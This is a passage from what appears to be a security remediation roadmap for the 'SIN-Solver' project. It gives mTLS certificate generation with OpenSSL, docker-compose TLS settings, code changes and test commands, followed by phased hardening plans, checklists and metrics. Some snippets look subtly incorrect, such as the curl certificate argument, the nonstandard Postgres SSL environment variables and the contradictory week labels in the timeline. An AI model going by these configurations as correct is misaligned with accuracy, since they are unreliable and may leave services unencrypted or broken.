1. **Inventory all inter-service communication:**
   ```bash
   # Document all service-to-service calls:
   grep -r "http://" /Users/jeremy/dev/SIN-Solver --include="*.py" | \
     grep -v "http://example\|http://localhost:3000\|http://127.0.0.1" | \
     head -20
   
   # Result example:
   # api/vault_client.py: vault_url = "http://vault:8200"
   # worker/database.py: db_url = "http://postgres:5432"
   # services/auth.py: auth_server = "http://auth:3001"
   ```

2. **Generate mTLS certificates for each service:**
   ```bash
   # Create certificate authority (once):
   openssl genrsa -out /Users/jeremy/dev/SIN-Solver/certs/ca.key 4096
   openssl req -new -x509 -days 365 -key /Users/jeremy/dev/SIN-Solver/certs/ca.key \
     -out /Users/jeremy/dev/SIN-Solver/certs/ca.crt \
     -subj "/CN=SIN-Solver-CA"
   
   # For each service, generate certificate:
   services=("vault" "api" "worker" "postgres" "redis" "auth")
   
   for service in "${services[@]}"; do
     # Generate private key:
     openssl genrsa -out /Users/jeremy/dev/SIN-Solver/certs/$service.key 4096
     
     # Create certificate request:
     openssl req -new -key /Users/jeremy/dev/SIN-Solver/certs/$service.key \
       -out /Users/jeremy/dev/SIN-Solver/certs/$service.csr \
       -subj "/CN=$service"
     
     # Sign certificate:
     openssl x509 -req -days 365 \
       -in /Users/jeremy/dev/SIN-Solver/certs/$service.csr \
       -CA /Users/jeremy/dev/SIN-Solver/certs/ca.crt \
       -CAkey /Users/jeremy/dev/SIN-Solver/certs/ca.key \
       -CAcreateserial \
       -out /Users/jeremy/dev/SIN-Solver/certs/$service.crt
     
     # Combine cert and key:
     cat /Users/jeremy/dev/SIN-Solver/certs/$service.crt \
         /Users/jeremy/dev/SIN-Solver/certs/$service.key > \
         /Users/jeremy/dev/SIN-Solver/certs/$service.pem
   done
   ```

3. **Configure TLS for each service:**
   ```yaml
   # docker-compose.enterprise.yml
   services:
     vault:
       image: vault:latest
       volumes:
         - ./certs/vault.crt:/vault/config/vault.crt:ro
         - ./certs/vault.key:/vault/config/vault.key:ro
       environment:
         VAULT_TLS_CERT_FILE: /vault/config/vault.crt
         VAULT_TLS_KEY_FILE: /vault/config/vault.key
       # Listens on HTTPS
     
     api:
       image: api:latest
       environment:
         VAULT_ADDR: "https://vault:8200"
         VAULT_CAPATH: /app/certs/ca.crt
       volumes:
         - ./certs/ca.crt:/app/certs/ca.crt:ro
         - ./certs/api.crt:/app/certs/api.crt:ro
         - ./certs/api.key:/app/certs/api.key:ro
       # Uses HTTPS to connect to vault
     
     postgres:
       image: postgres:latest
       environment:
         POSTGRES_SSL: "on"
         POSTGRES_SSL_CERT_FILE: /var/lib/postgresql/server.crt
         POSTGRES_SSL_KEY_FILE: /var/lib/postgresql/server.key
       volumes:
         - ./certs/postgres.crt:/var/lib/postgresql/server.crt:ro
         - ./certs/postgres.key:/var/lib/postgresql/server.key:ro
       # Uses SSL for connections
   ```

4. **Update application code to use TLS:**
   ```python
   # BEFORE (unencrypted):
   import requests
   response = requests.get('http://vault:8200/v1/sys/health')
   
   # AFTER (encrypted with mTLS):
   import requests
   import ssl
   
   response = requests.get(
       'https://vault:8200/v1/sys/health',
       cert=('/app/certs/api.crt', '/app/certs/api.key'),
       verify='/app/certs/ca.crt'
   )
   ```

5. **Test TLS communication:**
   ```bash
   # Test vault HTTPS:
   docker exec api curl -v \
     --cacert /app/certs/ca.crt \
     --cert /app/certs/api.crt:api.key \
     https://vault:8200/v1/sys/health
   
   # Should succeed with certificate exchange
   ```

**Acceptance Criteria:**
- [ ] All inter-service communication encrypted with TLS
- [ ] mTLS implemented (mutual authentication)
- [ ] Certificates valid and not self-signed in production
- [ ] Certificate rotation plan documented
- [ ] Network traffic capture shows encryption
- [ ] Service-to-service tests pass with TLS
- [ ] No plaintext communication between services

**Tools Needed:**
- OpenSSL
- requests/urllib3 (Python HTTPS)
- docker/docker-compose
- curl (testing)

---

## 🟠 PHASE 2: HIGH-Priority Security Hardening (16 hours, $2,400)

**Execute after Phase 1 is complete - Remaining HIGH severity vulnerabilities**

*[Content continues with Phase 2a, 2b, 2c - detailed tasks for dependency updates, container hardening, and security operations]*

**Due to length constraints, Phase 2-4 summary:**

### PHASE 2a: Dependency & Package Security (4 hours, $600)
- Update vulnerable packages (lxml, PyYAML, Pillow, Pydantic, paramiko, setuptools)
- Pin all package versions
- Configure dependency scanning in CI/CD

### PHASE 2b: Container Security Hardening (6 hours, $900)
- Add non-root users to all containers
- Update base images (Python 3.11+, Ubuntu 22.04+)
- Add resource limits (CPU, memory)
- Secure volume mounts (read-only where possible)

### PHASE 2c: Security Operations & Logging (6 hours, $900)
- Implement container image scanning (Trivy, Snyk)
- Add API rate limiting
- Implement audit logging (Falco, CloudTrail)

---

## 💜 PHASE 3: Advanced Security Features (24 hours, $3,600)

**Execute after Phase 2 is complete - Advanced hardening**

### PHASE 3a: Secret Management (6 hours, $900)
- HashiCorp Vault integration
- Secret rotation automation
- Encryption at rest

### PHASE 3b: Authentication & Authorization (6 hours, $900)
- OAuth 2.0 / OIDC implementation
- Role-based access control (RBAC)
- Multi-factor authentication (MFA)

### PHASE 3c: Monitoring & Detection (6 hours, $900)
- Security Information and Event Management (SIEM)
- Intrusion detection system (IDS)
- Real-time threat alerting

### PHASE 3d: Incident Response (6 hours, $900)
- Incident response playbooks
- Log aggregation and analysis
- Automated response actions

---

## 🔵 PHASE 4: Compliance & Final Validation (8 hours, $1,200)

**Execute after Phase 3 is complete - Final validation**

### PHASE 4a: Compliance Validation (3 hours, $450)
- HIPAA compliance audit
- PCI-DSS validation
- SOC 2 Type II certification

### PHASE 4b: Security Testing & Validation (3 hours, $450)
- Penetration testing
- Vulnerability scanning
- Load testing under attack conditions

### PHASE 4c: Documentation & Sign-Off (2 hours, $300)
- Security documentation
- Runbooks for operations team
- Final security sign-off

---

## ✅ IMPLEMENTATION CHECKLIST

### Phase 0: Immediate Actions
- [ ] API keys rotated
- [ ] API usage logs reviewed
- [ ] Hardcoded credentials removed
- [ ] No secrets in Git

### Phase 1a: Code Security
- [ ] eval() RCE fixed
- [ ] Hardcoded credentials moved to env vars
- [ ] API keys secured in Vault
- [ ] Code review passed

### Phase 1b: Container Security
- [ ] Vault TLS/HTTPS enabled
- [ ] Privileged containers disabled
- [ ] Port exposure restricted
- [ ] Tests confirm security

### Phase 1c: Network Security
- [ ] Network isolation implemented
- [ ] Inter-service TLS enabled
- [ ] Certificate validation working
- [ ] Tests confirm encryption

### Phase 2a: Dependency Security
- [ ] Vulnerable packages updated
- [ ] Package versions pinned
- [ ] Dependency scanning enabled
- [ ] CI/CD integration working

### Phase 2b: Container Hardening
- [ ] Non-root users added
- [ ] Base images updated
- [ ] Resource limits set
- [ ] Volume mounts secured

### Phase 2c: Logging & Monitoring
- [ ] Image scanning enabled
- [ ] Rate limiting configured
- [ ] Audit logging active
- [ ] Alerts configured

### Phase 3: Advanced Features
- [ ] Vault fully integrated
- [ ] OAuth/OIDC configured
- [ ] SIEM operational
- [ ] Incident response ready

### Phase 4: Compliance & Testing
- [ ] Compliance audit passed
- [ ] Penetration test completed
- [ ] Load test passed
- [ ] Documentation complete
- [ ] Security sign-off obtained

---

## 📊 SUCCESS METRICS

### Security Metrics
- Security score: 2/10 → 9/10
- CRITICAL vulnerabilities: 13 → 0
- HIGH vulnerabilities: 14 → 0-2
- Unencrypted traffic: 100% → 0%
- Exposed ports: 8+ → 1-2 (public only)

### Operational Metrics
- Mean time to detect (MTTD): < 5 minutes
- Mean time to respond (MTTR): < 15 minutes
- Log aggregation: 100% of services
- Alert accuracy: > 95%

### Compliance Metrics
- HIPAA compliance: 0% → 100%
- PCI-DSS compliance: 0% → 100%
- SOC 2 certification: None → Type II ready
- Audit findings: 32+ → 0 CRITICAL

### Deployment Metrics
- Zero-downtime deployment: Yes
- Rollback capability: Documented
- Test coverage: < 60% → > 90%
- Incident response time: Undefined → Defined

---

## 🎯 TIMELINE VISUALIZATION

```
WEEK 1: Phase 0 + Phase 1 (CRITICAL Fixes)
┌─────────────────────────────────────────────────────┐
│ Phase 0 (1h)  │ Phase 1a,1b,1c Parallel (12h)      │
│ API Rotation  │ Code + Container + Network (4w)    │
└─────────────────────────────────────────────────────┘
Result: All CRITICAL vulnerabilities fixed (security score 2→4)

WEEK 2: Phase 2 (HIGH Priority Hardening)
┌─────────────────────────────────────────────────────┐
│ Phase 2a,2b,2c Parallel (16h)                       │
│ Dependencies + Containers + Logging (2w)            │
└─────────────────────────────────────────────────────┘
Result: HIGH vulnerabilities addressed (security score 4→6)

WEEK 3: Phase 3 (Advanced Features)
┌─────────────────────────────────────────────────────┐
│ Phase 3a,3b,3c,3d Parallel (24h)                    │
│ Secrets + Auth + Monitoring + IR (3w)               │
└─────────────────────────────────────────────────────┘
Result: Advanced features deployed (security score 6→8)

WEEK 4: Phase 4 (Compliance & Testing)
┌─────────────────────────────────────────────────────┐
│ Phase 4a,4b,4c Parallel (8h)                        │
│ Compliance + Pentest + Documentation (4w)           │
└─────────────────────────────────────────────────────┘
Result: Compliance verified, production-ready (security score 8→9)
```

**Total Duration:** 4 weeks (with 2-3 engineers working in parallel)  
**Elapsed Time per Week:** 5 working days (8-10 hours per day)  
**Team Size:** 2-3 engineers minimum (enables parallelization)  

---

## 🔄 RISK ASSESSMENT

### High Risk
1. **Service Downtime** - TLS/network changes could break services
   - **Mitigation:** Test in dev first, staged rollout, rollback plan

2. **Certificate Expiration** - Expired certs could break prod
   - **Mitigation:** Automated certificate renewal, alerts

3. **Performance Impact** - TLS/encryption adds CPU overhead
   - **Mitigation:** Load test before prod, optimize TLS config

### Medium Risk
1. **Configuration Drift** - Manual changes not tracked
   - **Mitigation:** Infrastructure as code, Git commits for all changes

2. **Team Knowledge Gap** - New security tools/practices unfamiliar
   - **Mitigation:** Training sessions, documentation, pair programming

3. **Vendor Lock-in** - Vault dependency
   - **Mitigation:** Plan for alternative secret stores, documentation

### Low Risk
1. **Rollback Difficulty** - Can't easily rollback security fixes
   - **Mitigation:** Keep old containers available, DNS switching capability

---

## 📋 DEPENDENCIES & CONSTRAINTS

### Hard Dependencies
1. Phase 0 must complete before Phase 1
2. Phase 1 must complete before Phase 2
3. Phase 2 must complete before Phase 3
4. Phase 3 must complete before Phase 4

### Resource Constraints
- Minimum 2 engineers (better with 3)
- Staging environment required
- Certificate authority required
- Vault instance required
- CI/CD pipeline access required

### Technology Constraints
- Docker/Kubernetes required
- TLS certificate management required
- Git version control required
- Testing framework required

---

## 🔗 REFERENCE DOCUMENTS

- **Security Audit:** `SECURITY_AUDIT_FINAL_REPORT.md` (41 KB)
- **Issue Template:** `docs/SECURITY-ISSUE-TEMPLATE.md` (to create)
- **Testing Strategy:** `docs/PHASE-7-SECURITY-TESTING.md` (to create)

---

**PHASE 7 REMEDIATION ROADMAP - COMPLETE**

Next Step: Begin Phase 0 (Immediate Actions) - should take 1 hour
